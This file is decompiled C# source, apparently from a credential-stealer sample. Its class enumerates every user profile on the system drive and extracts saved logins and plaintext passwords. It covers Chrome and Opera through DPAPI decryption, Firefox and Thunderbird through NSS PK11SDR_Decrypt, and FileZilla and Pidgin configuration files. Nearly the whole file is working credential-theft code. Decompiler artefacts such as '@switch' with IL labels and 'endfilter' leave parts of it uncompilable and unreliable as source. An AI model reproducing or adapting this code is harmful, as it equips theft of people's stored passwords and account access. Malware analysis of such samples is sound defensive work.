using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Xml;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace WindowsApplication710
{
	// Token: 0x0200000C RID: 12
	internal class PREC
	{
		// Token: 0x0600002F RID: 47
		[DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptUnprotectData(ref PREC.DATA_BLOB pDataIn, string szDataDescr, ref PREC.DATA_BLOB pOptionalEntropy, IntPtr pvReserved, ref PREC.CRYPTPROTECT_PROMPTSTRUCT pPromptStruct, int dwFlags, ref PREC.DATA_BLOB pDataOut);

		// Token: 0x06000030 RID: 48 RVA: 0x00002CA8 File Offset: 0x00000EA8
		private string Decrypt(byte[] Datas)
		{
			int num;
			string text;
			int num4;
			object obj;
			try
			{
				IL_01:
				ProjectData.ClearProjectError();
				num = -2;
				IL_0A:
				int num2 = 2;
				PREC.DATA_BLOB data_BLOB = default(PREC.DATA_BLOB);
				IL_15:
				num2 = 3;
				PREC.DATA_BLOB data_BLOB2 = default(PREC.DATA_BLOB);
				IL_20:
				num2 = 4;
				GCHandle gchandle = GCHandle.Alloc(Datas, GCHandleType.Pinned);
				IL_2B:
				num2 = 5;
				data_BLOB.pbData = gchandle.AddrOfPinnedObject();
				IL_3C:
				num2 = 6;
				data_BLOB.cbData = Datas.Length;
				IL_49:
				num2 = 7;
				gchandle.Free();
				IL_53:
				num2 = 8;
				string szDataDescr = null;
				PREC.DATA_BLOB data_BLOB4;
				PREC.DATA_BLOB data_BLOB3 = data_BLOB4;
				IntPtr intPtr;
				IntPtr pvReserved = intPtr;
				PREC.CRYPTPROTECT_PROMPTSTRUCT cryptprotect_PROMPTSTRUCT2;
				PREC.CRYPTPROTECT_PROMPTSTRUCT cryptprotect_PROMPTSTRUCT = cryptprotect_PROMPTSTRUCT2;
				PREC.CryptUnprotectData(ref data_BLOB, szDataDescr, ref data_BLOB3, pvReserved, ref cryptprotect_PROMPTSTRUCT, 0, ref data_BLOB2);
				IL_70:
				num2 = 9;
				checked
				{
					byte[] array = new byte[data_BLOB2.cbData + 1];
					IL_84:
					num2 = 10;
					Marshal.Copy(data_BLOB2.pbData, array, 0, data_BLOB2.cbData);
					IL_9E:
					num2 = 11;
					string @string = Encoding.UTF8.GetString(array);
					IL_B0:
					num2 = 12;
					text = @string.Substring(0, @string.Length - 1);
					IL_CB:
					goto IL_15E;
					IL_D0:;
				}
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_114:
				goto IL_153;
				IL_116:
				num4 = num2;
				if (num <= -2)
				{
					goto IL_D0;
				}
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_12F:;
			}
			catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj2;
				goto IL_116;
			}
			IL_153:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_15E:
			string result = text;
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
			return result;
		}

		// Token: 0x06000031 RID: 49 RVA: 0x00002E3C File Offset: 0x0000103C
		private long PK11_GetInternalKeySlot()
		{
			return this.CreateAPI<PREC.DLLFunctionDelegate2>(this.NSS3, "PK11_GetInternalKeySlot")();
		}

		// Token: 0x06000032 RID: 50 RVA: 0x00002E64 File Offset: 0x00001064
		private long PK11_Authenticate(long slot, bool loadCerts, long wincx)
		{
			return this.CreateAPI<PREC.DLLFunctionDelegate3>(this.NSS3, "PK11_Authenticate")(slot, loadCerts, wincx);
		}

		// Token: 0x06000033 RID: 51 RVA: 0x00002E8C File Offset: 0x0000108C
		private int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
		{
			return this.CreateAPI<PREC.DLLFunctionDelegate4>(this.NSS3, "NSSBase64_DecodeBuffer")(arenaOpt, outItemOpt, inStr, inLen);
		}

		// Token: 0x06000034 RID: 52 RVA: 0x00002EB8 File Offset: 0x000010B8
		private int PK11SDR_Decrypt(ref PREC.TSECItem data, ref PREC.TSECItem result, int cx)
		{
			return this.CreateAPI<PREC.DLLFunctionDelegate5>(this.NSS3, "PK11SDR_Decrypt")(ref data, ref result, cx);
		}

		// Token: 0x06000035 RID: 53 RVA: 0x00002EE0 File Offset: 0x000010E0
		private long NSS_Shutdown()
		{
			return this.CreateAPI<PREC.DLLFunctionDelegate6>(this.NSS3, "NSS_Shutdown")();
		}

		// Token: 0x06000036 RID: 54
		[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern IntPtr LoadLibrary(string dllFilePath);

		// Token: 0x06000037 RID: 55
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern bool FreeLibrary(IntPtr hModule);

		// Token: 0x06000038 RID: 56
		[DllImport("Kernel32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		private static extern bool IsWow64Process(IntPtr hProcess, ref bool wow64Process);

		// Token: 0x06000039 RID: 57
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

		// Token: 0x0600003A RID: 58 RVA: 0x00002F08 File Offset: 0x00001108
		private T CreateAPI<T>(string name, string method)
		{
			return this.CreateAPI<T>(PREC.LoadLibrary(name), method);
		}

		// Token: 0x0600003B RID: 59 RVA: 0x00002F24 File Offset: 0x00001124
		private T CreateAPI<T>(IntPtr hModule, string method)
		{
			int num;
			T t;
			int num4;
			object obj;
			try
			{
				IL_01:
				ProjectData.ClearProjectError();
				num = -2;
				IL_09:
				int num2 = 2;
				t = (T)((object)Marshal.GetDelegateForFunctionPointer(PREC.GetProcAddress(hModule, method), typeof(T)));
				IL_29:
				goto IL_89;
				IL_2B:
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_45:
				goto IL_7E;
				IL_47:
				num4 = num2;
				if (num <= -2)
				{
					goto IL_2B;
				}
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_5C:;
			}
			catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj2;
				goto IL_47;
			}
			IL_7E:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_89:
			T result = t;
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
			return result;
		}

		// Token: 0x0600003C RID: 60
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern bool Wow64DisableWow64FsRedirection(ref IntPtr ptr);

		// Token: 0x0600003D RID: 61
		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern bool Wow64RevertWow64FsRedirection(IntPtr ptr);

		// Token: 0x0600003E RID: 62 RVA: 0x00002FD4 File Offset: 0x000011D4
		public bool RecoverOpera()
		{
			checked
			{
				bool result;
				try
				{
					foreach (string str in this.GetAppDataFolders())
					{
						if (File.Exists(str + "\\Roaming\\Opera Software\\Opera Stable\\Login Data"))
						{
							SQLiteHandler sqliteHandler = new SQLiteHandler(str + "\\Roaming\\Opera Software\\Opera Stable\\Login Data");
							sqliteHandler.ReadTable("logins");
							int num = 0;
							int num2 = sqliteHandler.GetRowCount() - 1;
							int num3 = num;
							for (;;)
							{
								int num4 = num3;
								int num5 = num2;
								if (num4 > num5)
								{
									break;
								}
								string value = sqliteHandler.GetValue(num3, "origin_url");
								string value2 = sqliteHandler.GetValue(num3, "username_value");
								string value3 = sqliteHandler.GetValue(num3, "password_value");
								string password = Conversions.ToString(Interaction.IIf(string.IsNullOrEmpty(value3), "", this.Decrypt(Encoding.Default.GetBytes(value3))));
								Account item = new Account(AccountType.Opera, value2, password, value);
								this.Accounts.Add(item);
								num3++;
							}
						}
					}
					result = true;
				}
				catch (Exception ex)
				{
					result = false;
				}
				return result;
			}
		}

		// Token: 0x0600003F RID: 63 RVA: 0x000030F0 File Offset: 0x000012F0
		public bool RecoverChrome()
		{
			checked
			{
				bool result;
				try
				{
					foreach (string str in this.GetAppDataFolders())
					{
						if (File.Exists(str + "\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"))
						{
							SQLiteHandler sqliteHandler = new SQLiteHandler(str + "\\Local\\Google\\Chrome\\User Data\\Default\\Login Data");
							sqliteHandler.ReadTable("logins");
							int num = 0;
							int num2 = sqliteHandler.GetRowCount() - 1;
							int num3 = num;
							for (;;)
							{
								int num4 = num3;
								int num5 = num2;
								if (num4 > num5)
								{
									break;
								}
								string value = sqliteHandler.GetValue(num3, "origin_url");
								string value2 = sqliteHandler.GetValue(num3, "username_value");
								string value3 = sqliteHandler.GetValue(num3, "password_value");
								string password = Conversions.ToString(Interaction.IIf(string.IsNullOrEmpty(value3), "", this.Decrypt(Encoding.Default.GetBytes(value3))));
								Account item = new Account(AccountType.Chrome, value2, password, value);
								this.Accounts.Add(item);
								num3++;
							}
						}
					}
					result = true;
				}
				catch (Exception ex)
				{
					result = false;
				}
				return result;
			}
		}

		// Token: 0x06000040 RID: 64 RVA: 0x00003210 File Offset: 0x00001410
		private string FindFirefoxInstallationPath()
		{
			string text = string.Empty;
			foreach (string path in this.GetInstalledAppsDirs())
			{
				foreach (string text2 in Directory.GetDirectories(path, "Mozilla Firefox", SearchOption.TopDirectoryOnly))
				{
					text = text2;
					if (!string.IsNullOrEmpty(text))
					{
						break;
					}
				}
			}
			return text;
		}

		// Token: 0x06000041 RID: 65 RVA: 0x00003280 File Offset: 0x00001480
		private string FindFirefoxProfilePath(string AppDataDir)
		{
			string path = AppDataDir + "\\Roaming\\Mozilla\\Firefox\\Profiles";
			return Directory.GetDirectories(path)[0];
		}

		// Token: 0x06000042 RID: 66 RVA: 0x000032A8 File Offset: 0x000014A8
		private long NSS_Init(string configdir)
		{
			this.hModuleList.Add(PREC.LoadLibrary(this.FindFirefoxInstallationPath() + "\\mozglue.dll"));
			this.NSS3 = PREC.LoadLibrary(this.FindFirefoxInstallationPath() + "\\nss3.dll");
			this.hModuleList.Add(this.NSS3);
			return this.CreateAPI<PREC.DLLFunctionDelegate>(this.NSS3, "NSS_Init")(configdir);
		}

		// Token: 0x06000043 RID: 67 RVA: 0x0000331C File Offset: 0x0000151C
		private object DecryptFF(string str)
		{
			int num;
			object obj2;
			int num4;
			object obj3;
			try
			{
				IL_01:
				ProjectData.ClearProjectError();
				num = -2;
				IL_0A:
				int num2 = 2;
				StringBuilder stringBuilder = new StringBuilder(str);
				IL_15:
				num2 = 3;
				int value = this.NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Length);
				IL_32:
				num2 = 4;
				PREC.TSECItem tsecitem = default(PREC.TSECItem);
				IL_3D:
				num2 = 5;
				IntPtr intPtr = new IntPtr(value);
				object obj = Marshal.PtrToStructure(intPtr, typeof(PREC.TSECItem));
				PREC.TSECItem tsecitem3;
				PREC.TSECItem tsecitem2 = (obj != null) ? ((PREC.TSECItem)obj) : tsecitem3;
				IL_6C:
				num2 = 6;
				if (this.PK11SDR_Decrypt(ref tsecitem2, ref tsecitem, 0) != 0)
				{
					goto IL_DF;
				}
				IL_7F:
				num2 = 7;
				if (tsecitem.SECItemLen == 0)
				{
					goto IL_DF;
				}
				IL_91:
				num2 = 8;
				byte[] array = new byte[checked(tsecitem.SECItemLen - 1 + 1)];
				IL_A6:
				num2 = 9;
				intPtr = new IntPtr(tsecitem.SECItemData);
				Marshal.Copy(intPtr, array, 0, tsecitem.SECItemLen);
				IL_C9:
				num2 = 10;
				obj2 = Encoding.UTF8.GetString(array);
				goto IL_185;
				IL_DF:
				num2 = 13;
				obj2 = string.Empty;
				IL_EE:
				goto IL_185;
				IL_F3:
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_13B:
				goto IL_17A;
				IL_13D:
				num4 = num2;
				if (num <= -2)
				{
					goto IL_F3;
				}
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_156:;
			}
			catch when (endfilter(obj3 is Exception & num != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj4;
				goto IL_13D;
			}
			IL_17A:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_185:
			object result = obj2;
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
			return result;
		}

		// Token: 0x06000044 RID: 68 RVA: 0x000034D4 File Offset: 0x000016D4
		public bool RecoverFireFox()
		{
			bool result = false;
			checked
			{
				try
				{
					string appDataDir = Interaction.Environ("windir").ToLower().Replace("\\windows", null) + "\\users\\" + Interaction.Environ("username") + "\\AppData";
					string text = this.FindFirefoxProfilePath(appDataDir).Replace("Profiles/", "Profiles\\");
					if (Directory.Exists(text))
					{
						string input = File.ReadAllText(text + "\\logins.json");
						this.NSS_Init(text + "\\");
						Regex regex = new Regex("\\\"(hostname|encryptedPassword|encryptedUsername)\":\"(.*?)\"");
						MatchCollection matchCollection = regex.Matches(input);
						int num = 0;
						int num2 = matchCollection.Count - 1;
						int num3 = num;
						for (;;)
						{
							int num4 = num3;
							int num5 = num2;
							if (num4 > num5)
							{
								break;
							}
							string value = matchCollection[num3].Groups[2].Value;
							string value2 = matchCollection[num3 + 1].Groups[2].Value;
							string value3 = matchCollection[num3 + 2].Groups[2].Value;
							Account item = new Account(AccountType.Firefox, Conversions.ToString(this.DecryptFF(value2)), Conversions.ToString(this.DecryptFF(value3)), value);
							this.Accounts.Add(item);
							num3 += 3;
						}
						this.NSS_Shutdown();
						try
						{
							foreach (IntPtr hModule in this.hModuleList)
							{
								PREC.FreeLibrary(hModule);
							}
						}
						finally
						{
							List<IntPtr>.Enumerator enumerator;
							((IDisposable)enumerator).Dispose();
						}
						result = true;
					}
				}
				catch (Exception ex)
				{
					result = false;
				}
				return result;
			}
		}

		// Token: 0x06000045 RID: 69 RVA: 0x000036B0 File Offset: 0x000018B0
		private string FindThunderbirdProfilePath(string AppDataDir)
		{
			string text = AppDataDir + "\\Roaming\\Thunderbird";
			string result;
			if (!Directory.Exists(text))
			{
				result = string.Empty;
			}
			else
			{
				string value = new Regex("Path=([A-z0-9\\/\\.]+)").Match(File.ReadAllText(text + "\\profiles.ini")).Groups[1].Value;
				result = text + "\\" + value;
			}
			return result;
		}

		// Token: 0x06000046 RID: 70 RVA: 0x0000371C File Offset: 0x0000191C
		public bool RecoverThunderbird()
		{
			bool result = false;
			IntPtr ptr = 0;
			PREC.Wow64DisableWow64FsRedirection(ref ptr);
			checked
			{
				try
				{
					foreach (string appDataDir in this.GetAppDataFolders())
					{
						string text = this.FindThunderbirdProfilePath(appDataDir);
						if (Directory.Exists(text))
						{
							string input = File.ReadAllText(text + "\\logins.json");
							this.NSS_Init(text + "\\");
							Regex regex = new Regex("\\\"(hostname|encryptedPassword|encryptedUsername)\":\"(.*?)\"");
							MatchCollection matchCollection = regex.Matches(input);
							int num = 0;
							int num2 = matchCollection.Count - 1;
							int num3 = num;
							for (;;)
							{
								int num4 = num3;
								int num5 = num2;
								if (num4 > num5)
								{
									break;
								}
								string value = matchCollection[num3].Groups[2].Value;
								string value2 = matchCollection[num3 + 1].Groups[2].Value;
								string value3 = matchCollection[num3 + 2].Groups[2].Value;
								Account item = new Account(AccountType.Thunderbird, Conversions.ToString(this.DecryptFF(value2)), Conversions.ToString(this.DecryptFF(value3)), value);
								this.Accounts.Add(item);
								num3 += 3;
							}
							this.NSS_Shutdown();
							try
							{
								foreach (IntPtr hModule in this.hModuleList)
								{
									PREC.FreeLibrary(hModule);
								}
							}
							finally
							{
								List<IntPtr>.Enumerator enumerator;
								((IDisposable)enumerator).Dispose();
							}
						}
					}
					result = true;
				}
				catch (Exception ex)
				{
					result = false;
				}
				PREC.Wow64RevertWow64FsRedirection(ptr);
				return result;
			}
		}

		// Token: 0x06000047 RID: 71 RVA: 0x000038F8 File Offset: 0x00001AF8
		public bool RecoverFileZilla()
		{
			bool result;
			try
			{
				foreach (string str in this.GetAppDataFolders())
				{
					if (File.Exists(str + "\\Roaming\\FileZilla\\recentservers.xml"))
					{
						XmlDocument xmlDocument = new XmlDocument();
						xmlDocument.Load(str + "\\Roaming\\FileZilla\\recentservers.xml");
						try
						{
							foreach (object obj in xmlDocument.ChildNodes[1].SelectNodes("RecentServers/Server"))
							{
								XmlNode xmlNode = (XmlNode)obj;
								string domain = string.Format("{0}:{1}", this.ExtractValue(xmlNode, "Host", false), this.ExtractValue(xmlNode, "Port", false));
								string username = this.ExtractValue(xmlNode, "User", false);
								string password = this.ExtractValue(xmlNode, "Pass", xmlNode.SelectSingleNode("Pass[@encoding='base64']") != null);
								Account item = new Account(AccountType.FileZilla, username, password, domain);
								this.Accounts.Add(item);
							}
						}
						finally
						{
							IEnumerator enumerator;
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
					}
				}
				result = true;
			}
			catch (Exception ex)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000048 RID: 72 RVA: 0x00003A70 File Offset: 0x00001C70
		public bool RecoverPidgin()
		{
			bool result;
			try
			{
				foreach (string str in this.GetAppDataFolders())
				{
					if (File.Exists(str + "\\Roaming\\.purple\\accounts.xml"))
					{
						XmlDocument xmlDocument = new XmlDocument();
						xmlDocument.Load(str + "\\Roaming\\.purple\\accounts.xml");
						try
						{
							foreach (object obj in xmlDocument.ChildNodes[1].SelectNodes("account"))
							{
								XmlNode node = (XmlNode)obj;
								string domain = this.ExtractValue(node, "protocol", false);
								string username = this.ExtractValue(node, "name", false);
								string password = this.ExtractValue(node, "password", false);
								Account item = new Account(AccountType.Pidgin, username, password, domain);
								this.Accounts.Add(item);
							}
						}
						finally
						{
							IEnumerator enumerator;
							if (enumerator is IDisposable)
							{
								(enumerator as IDisposable).Dispose();
							}
						}
					}
				}
				result = true;
			}
			catch (Exception ex)
			{
				result = false;
			}
			return result;
		}

		// Token: 0x06000049 RID: 73 RVA: 0x00003BA4 File Offset: 0x00001DA4
		private string ExtractValue(XmlNode Node, string Key, bool DecodeBase64 = false)
		{
			XmlNode xmlNode = Node.SelectSingleNode(Key);
			string result;
			if (DecodeBase64)
			{
				result = new UTF8Encoding().GetString(Convert.FromBase64String(xmlNode.InnerText));
			}
			else
			{
				result = xmlNode.InnerText;
			}
			return result;
		}

		// Token: 0x0600004A RID: 74 RVA: 0x00003BDC File Offset: 0x00001DDC
		private bool isWindowsXP()
		{
			return Environment.OSVersion.Version.Major == 5;
		}

		// Token: 0x0600004B RID: 75 RVA: 0x00003BFC File Offset: 0x00001DFC
		public string[] GetAppDataFolders()
		{
			List<string> list = new List<string>();
			if (this.isWindowsXP())
			{
				try
				{
					foreach (string str in Directory.GetDirectories(this.Drive.RootDirectory.FullName + "Documents and Settings\\", "*", SearchOption.TopDirectoryOnly))
					{
						list.Add(str + "Application Data");
					}
					goto IL_E9;
				}
				catch (Exception ex)
				{
					goto IL_E9;
				}
			}
			foreach (string path in Directory.GetDirectories(this.Drive.RootDirectory.FullName + "Users\\", "*", SearchOption.TopDirectoryOnly))
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(path);
				list.Add(this.Drive.RootDirectory.FullName + "Users\\" + directoryInfo.Name + "\\AppData");
			}
			IL_E9:
			return list.ToArray();
		}

		// Token: 0x0600004C RID: 76 RVA: 0x00003D0C File Offset: 0x00001F0C
		private string[] GetInstalledAppsDirs()
		{
			List<string> list = new List<string>();
			foreach (string item in Directory.GetDirectories(this.Drive.RootDirectory.FullName, "Program Files*", SearchOption.TopDirectoryOnly))
			{
				list.Add(item);
			}
			return list.ToArray();
		}

		// Token: 0x0600004D RID: 77 RVA: 0x00003D68 File Offset: 0x00001F68
		private bool InternalCheckIsWow64()
		{
			if ((Environment.OSVersion.Version.Major == 5 && Environment.OSVersion.Version.Minor >= 1) || Environment.OSVersion.Version.Major >= 6)
			{
				using (Process currentProcess = Process.GetCurrentProcess())
				{
					bool result;
					if (!PREC.IsWow64Process(currentProcess.Handle, ref result))
					{
						return false;
					}
					return result;
				}
			}
			return false;
		}

		// Token: 0x0600004E RID: 78 RVA: 0x00003DF4 File Offset: 0x00001FF4
		public PREC(DriveInfo Drive)
		{
			this.hModuleList = new List<IntPtr>();
			this.is64BitProcess = (IntPtr.Size == 8);
			this.is64BitOperatingSystem = (this.is64BitProcess || this.InternalCheckIsWow64());
			this._accounts = new List<Account>();
			this.Drive = Drive;
		}

		// Token: 0x0600004F RID: 79 RVA: 0x00003E4C File Offset: 0x0000204C
		public PREC()
		{
			this.hModuleList = new List<IntPtr>();
			this.is64BitProcess = (IntPtr.Size == 8);
			this.is64BitOperatingSystem = (this.is64BitProcess || this.InternalCheckIsWow64());
			this._accounts = new List<Account>();
			foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
			{
				if (Operators.CompareString(driveInfo.RootDirectory.FullName, Path.GetPathRoot(Environment.SystemDirectory), false) == 0)
				{
					this.Drive = driveInfo;
					return;
				}
			}
		}

		// Token: 0x1700000C RID: 12
		// (get) Token: 0x06000050 RID: 80 RVA: 0x00003EE0 File Offset: 0x000020E0
		// (set) Token: 0x06000051 RID: 81 RVA: 0x00002150 File Offset: 0x00000350
		public DriveInfo Drive
		{
			get
			{
				return this._drive;
			}
			set
			{
				this._drive = value;
			}
		}

		// Token: 0x1700000D RID: 13
		// (get) Token: 0x06000052 RID: 82 RVA: 0x00003EF8 File Offset: 0x000020F8
		// (set) Token: 0x06000053 RID: 83 RVA: 0x00002159 File Offset: 0x00000359
		public List<Account> Accounts
		{
			get
			{
				return this._accounts;
			}
			set
			{
				this._accounts = value;
			}
		}

		// Token: 0x04000012 RID: 18
		private IntPtr NSS3;

		// Token: 0x04000013 RID: 19
		private List<IntPtr> hModuleList;

		// Token: 0x04000014 RID: 20
		private bool is64BitProcess;

		// Token: 0x04000015 RID: 21
		private bool is64BitOperatingSystem;

		// Token: 0x04000016 RID: 22
		private DriveInfo _drive;

		// Token: 0x04000017 RID: 23
		private List<Account> _accounts;

		// Token: 0x0200000F RID: 15
		[Flags]
		public enum CryptProtectPromptFlags
		{
			// Token: 0x04000024 RID: 36
			CRYPTPROTECT_PROMPT_ON_UNPROTECT = 1,
			// Token: 0x04000025 RID: 37
			CRYPTPROTECT_PROMPT_ON_PROTECT = 2
		}

		// Token: 0x02000010 RID: 16
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct CRYPTPROTECT_PROMPTSTRUCT
		{
			// Token: 0x04000026 RID: 38
			public int cbSize;

			// Token: 0x04000027 RID: 39
			public PREC.CryptProtectPromptFlags dwPromptFlags;

			// Token: 0x04000028 RID: 40
			public IntPtr hwndApp;

			// Token: 0x04000029 RID: 41
			public string szPrompt;
		}

		// Token: 0x02000011 RID: 17
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
		public struct DATA_BLOB
		{
			// Token: 0x0400002A RID: 42
			public int cbData;

			// Token: 0x0400002B RID: 43
			public IntPtr pbData;
		}

		// Token: 0x02000012 RID: 18
		public struct TSECItem
		{
			// Token: 0x0400002C RID: 44
			public int SECItemType;

			// Token: 0x0400002D RID: 45
			public int SECItemData;

			// Token: 0x0400002E RID: 46
			public int SECItemLen;
		}

		// Token: 0x02000013 RID: 19
		// (Invoke) Token: 0x06000062 RID: 98
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		private delegate long DLLFunctionDelegate(string configdir);

		// Token: 0x02000014 RID: 20
		// (Invoke) Token: 0x06000066 RID: 102
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		private delegate long DLLFunctionDelegate2();

		// Token: 0x02000015 RID: 21
		// (Invoke) Token: 0x0600006A RID: 106
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		private delegate long DLLFunctionDelegate3(long slot, bool loadCerts, long wincx);

		// Token: 0x02000016 RID: 22
		// (Invoke) Token: 0x0600006E RID: 110
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		private delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

		// Token: 0x02000017 RID: 23
		// (Invoke) Token: 0x06000072 RID: 114
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		private delegate int DLLFunctionDelegate5(ref PREC.TSECItem data, ref PREC.TSECItem result, int cx);

		// Token: 0x02000018 RID: 24
		// (Invoke) Token: 0x06000076 RID: 118
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		private delegate long DLLFunctionDelegate6();
	}
}
